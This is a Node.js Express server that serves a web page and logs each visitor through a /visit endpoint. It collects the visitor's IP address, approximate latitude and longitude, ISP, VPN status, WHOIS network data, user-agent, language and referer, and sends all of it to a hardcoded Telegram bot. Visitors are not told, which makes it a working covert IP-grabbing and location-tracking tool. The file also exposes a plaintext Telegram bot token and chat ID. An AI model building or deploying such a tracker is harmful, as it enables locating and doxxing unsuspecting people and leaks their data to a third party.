const express = require("express");
const path = require("path");

const app = express();
app.use(express.json());

// ====== CONFIG ======
const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
const TELEGRAM_CHAT_ID = "8059402181";
const PORT = process.env.PORT || 3000;

// ====== TELEGRAM ======
async function sendToTelegram(text) {
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text,
    }),
  });
}

// ====== WHOIS via RDAP (بديل آمن لـ whois CLI) ======
async function getWhois(ip) {
  try {
    // RIPE / ARIN RDAP (يشتغل عالميًا)
    const res = await fetch(`https://rdap.arin.net/registry/ip/${ip}`);
    const data = await res.json();

    return {
      network: data.name,
      cidr: data.cidr0_cidrs?.[0]?.v4prefix + "/" + data.cidr0_cidrs?.[0]?.length,
      org: data.entities?.[0]?.vcardArray?.[1]?.find(v => v[0] === "fn")?.[3],
      country: data.country,
      handle: data.handle,
    };
  } catch {
    return null;
  }
}

// ====== VISIT LOGGER ======
app.post("/visit", async (req, res) => {
  try {
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket.remoteAddress;

    // ===== GEO IP =====
    const geoRes = await fetch(
      `http://ip-api.com/json/${ip}?fields=66846719`
    );
    const geo = await geoRes.json();

    // ===== WHOIS =====
    const whois = await getWhois(ip);

    const ua = req.headers["user-agent"] || "unknown";
    const isMobile = /mobile|android|iphone/i.test(ua);

    const message = `
🛡️ Visit Log
----------------------
IP: ${ip}

🌍 Geo Location
Country: ${geo.country}
City: ${geo.city}
ISP: ${geo.isp}
ASN: ${geo.as}
VPN/Proxy: ${geo.proxy}
Hosting: ${geo.hosting}
Location: ${geo.lat}, ${geo.lon}

📡 WHOIS / Network
Org: ${whois?.org || "N/A"}
Network: ${whois?.network || "N/A"}
CIDR: ${whois?.cidr || "N/A"}
Handle: ${whois?.handle || "N/A"}
Country: ${whois?.country || "N/A"}

📱 Device
Type: ${isMobile ? "Mobile" : "Desktop"}

🧠 User-Agent
${ua}

🌐 Language: ${req.headers["accept-language"]}
🔗 Referer: ${req.headers["referer"] || "Direct"}

⏰ Time: ${new Date().toLocaleString()}
----------------------
`;

    await sendToTelegram(message);
    res.json({ logged: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "failed" });
  }
});

// ====== SERVE HTML ======
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
